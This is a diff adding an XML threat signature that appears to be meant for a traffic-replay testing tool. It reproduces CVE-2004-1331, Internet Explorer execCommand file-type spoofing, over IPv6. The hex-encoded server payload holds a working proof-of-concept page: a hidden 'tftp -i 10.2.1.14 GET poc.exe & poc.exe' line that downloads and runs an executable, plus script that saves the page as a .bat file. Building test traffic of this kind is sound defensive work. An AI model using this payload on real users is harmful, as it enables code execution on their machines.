@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer execCommand File Type Spoofing (IPv6 Version)"/>
+    <EngDesc display="true" value="A vulnerability exists in Microsoft Internet Explorer when the script command execCommand is used to save a document. A specially crafted filename will be displayed as another file type. An attacker can exploit this vulnerability to save code to the target system with the extension of an executable program (e.g. .js file) by tricking a user into believing that he is saving a non-executable file (e.g., .html file). (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Internet_Explorer"/>
+      <item value="Microsoft_Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_5.0_(all_versions)"/>
+      <item value="Microsoft_Internet_Explorer_5.01_(all_versions)"/>
+      <item value="Microsoft_Internet_Explorer_5.5_(all_versions)"/>
+      <item value="Microsoft_Internet_Explorer_6.0"/>
+      <item value="Microsoft_Internet_Explorer_6.0_SP1"/>
+      <item value="Microsoft_Internet_Explorer_6.0_SP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20041118-01"/>
+    <CVEID display="true" value="CVE-2004-1331"/>
+    <bugtraqID display="true" value="11686"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="7d77624d57997a364d4eba23f964281a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900710"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="6F063ABF" AckNumber="4CCCC412" HeaderLength="05" WindowSize="FAF0" Checksum="5666" UrgentPointer="0000" Options="" Payload="474554202F73732F20485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E313B20535631290D0A486F73743A2031302E322E312E31340D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="4CCCC412" AckNumber="6F063B87" HeaderLength="05" WindowSize="1920" Checksum="306F" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203138204E6F7620323030342032303A33313A313920474D540D0A5365727665723A204170616368652F322E302E3436202843656E744F53290D0A4C6173742D4D6F6469666965643A205468752C203138204E6F7620323030342032303A33303A343720474D540D0A455461673A20223639343035662D3162352D3433653534626330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203433370D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D5554462D380D0A0D0A506C656173653C212D2D20262074667470202D692031302E322E312E31342047455420706F632E657865202620706F632E6578650A3C68746D6C3E0A3C686561643E0A3C736372697074206C616E67756167653D224A617661536372697074223E0A7661722061203D2066616C73653B0A66756E6374696F6E2053617665417328297B0A69662028646F63756D656E742E65786563436F6D6D616E64297B0A6966202861297B646F63756D656E742E65786563436F6D6D616E642822536176654173222C20747275652C2022706F632E68746D6C2E62617422293B7D0A7D656C73657B0A616C6572742827436F6D6D616E64206E6F7420617661696C61626C6520696E20496E7465726E6574204578706C6F7265722076657273696F6E73206F6C646572207468616E20494520352E27293B0A7D0A7D0A0A3C2F7363726970743E0A3C2F686561643E0A3C626F6479206F6E6C6F61643D22613D74727565223E0A3C6120687265663D226A6176617363726970743A5361766541732829223E0A436C69636B204865726520546F2053617665205468697320506167650A3C2F613E0A0A3C2F626F64793E0A3C2F68746D6C3E0A0A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
